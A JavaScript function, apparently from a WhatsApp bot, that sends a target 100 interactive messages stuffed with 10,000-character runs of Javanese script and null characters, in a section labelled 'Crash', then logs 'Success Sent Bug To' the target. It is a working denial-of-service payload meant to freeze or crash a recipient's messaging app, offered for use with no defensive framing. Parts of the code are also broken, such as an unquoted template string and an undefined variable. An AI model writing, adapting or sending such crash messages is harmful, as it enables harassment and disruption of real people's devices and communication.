async function JtwFreze(sock, target) {
try {
  const videoPayload = await prepareWAMessageMedia({
    video: { url: "https://files.catbox.moe/74v4yo.mp4", gifPlayback: true }
  }, {
    upload: sock.waUploadToServer,
    mediaType: "video"
  })
  for (let i = 0; i < 100; i++) {
    const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
      interactiveMessage: {
        contextInfo: {
          mentionedJid: [jid],
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399013145023@newsletter",
            newsletterName: "Hii I'm Izii",
            serverMessageId: 1
          }
        },
        header: {
          title: "",
          ...videoPayload,
          hasMediaAttachment: true
        },
        body: { text: "Hama" },
        footer: { text: "" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: {"title":"${"ꦾ".repeat(10000)}","sections":[{"title":"Crash","rows":[]}]}
            },
            {
              name: "address_message",
              buttonParamsJson: JSON.stringify({
                "screen_1_TextInput_0": "radio - buttons" + "\u0000".repeat(10000),
                "screen_0_Dropdown_1":  "\u0000".repeat(10000),
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }),
              version: 3
            }
          ]
        }
      }
    }), { userJid: target })
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id })
  }
} catch (err) {
      console.error(err);
 }
console.log(chalk.red(`Success Sent Bug To ${target}`))
}